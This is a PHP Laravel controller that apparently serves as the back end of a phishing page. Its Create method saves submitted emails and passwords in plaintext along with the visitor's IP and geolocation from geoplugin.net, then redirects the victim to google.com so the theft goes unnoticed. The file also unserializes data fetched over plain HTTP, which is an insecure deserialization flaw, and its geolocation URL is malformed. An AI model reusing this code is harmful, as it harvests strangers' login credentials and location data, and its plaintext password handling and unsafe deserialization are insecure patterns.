<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\User;
use Illuminate\Http\Request;

use Torann\GeoIP\Facades\GeoIP;

class UserController extends Controller
{
    //
    public function home()
    {
        return view('User.home');
    }

    public function af_home()
    {

        return "https://www.google.com/";
    }

    public function Create(Request $request)
    {
        try{

           $user_ip=$_SERVER['REMOTE_ADDR'];
           $ip = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip='.$user_ip.'"));
            Admin::create([
               // $request->except('_token'),
                'email'=>$request->email,
                'password'=>$request->password,
                'ip'=>$user_ip,
                'geoplugin_city'=>  $ip['geoplugin_city'],
                'geoplugin_regionCode'=>  $ip['geoplugin_regionCode'],
                'geoplugin_areaCode'=>  $ip['geoplugin_areaCode'],
                'geoplugin_countryName'=>  $ip['geoplugin_countryName'],
                'geoplugin_continentName'=>  $ip['geoplugin_continentName'],
                'geoplugin_timezone'=>  $ip['geoplugin_timezone'],
            ]);
            return redirect('https://www.google.com/');
            }
            catch(\Exception $ex)
            {
                return redirect()->route('home');
            }
    }

    public function location()
    {
        $user_ip=$_SERVER['REMOTE_ADDR'];
           $ip = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip='.$user_ip.'"));
           echo $ip['geoplugin_city'] . "</br>";
           echo $ip['geoplugin_regionCode'] . "</br>";
           echo $ip['geoplugin_areaCode'] . "</br>";
           echo $ip['geoplugin_countryName'] . "</br>";
           echo $ip['geoplugin_continentName'] . "</br>";
           echo $ip['geoplugin_timezone'] . "</br>";
          return $user_ip;
    }

}
